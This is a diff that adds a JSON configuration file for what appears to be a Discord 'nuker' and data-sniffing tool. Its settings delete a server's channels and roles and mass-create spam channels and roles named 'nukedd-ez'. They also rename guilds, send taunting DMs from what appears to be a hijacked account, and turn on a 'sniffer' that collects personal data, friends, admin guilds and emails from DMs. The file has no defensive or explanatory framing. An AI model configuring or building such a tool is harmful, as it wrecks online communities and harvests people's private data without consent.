@@ -1,0 +1,21 @@
+{ 
+    "NUKER-SETTINGS": "TO GET HELP GO TO CONFIG SETTINGS",
+    "nuker-guilds-change-name" : "nuuked xxxd",
+    "nuker-channels-delete" : "true",
+    "nuker-channels-create-amount" : "25",
+    "nuker-channels-create-name" : "nukedd-ez",
+    "nuker-channels-create-message" : "nukedd ez",
+    "nuker-roles-delete" : "true",
+    "nuker-roles-create-amount" : "10",
+    "nuker-roles-create-name" : "nukedd-ez",
+    "nuker-no-perms-message" : "false",
+    "nuker-user-status" : "nukedd-ez",
+    "nuker-dm-amount" : "5",
+    "nuker-dm-message" : "account nukkedd ezzzz",
+    "nuker-sniffer-enabled" : "true",
+    "SNIFFER-SETTINGS" : "TO GET HELP GO TO CONFIG SETTINGS",
+    "sniff-personal" : "true",
+    "sniff-friends" : "true",
+    "sniff-admin-guilds" : "true",
+    "sniff-find-emails-dms" : "true"
+}
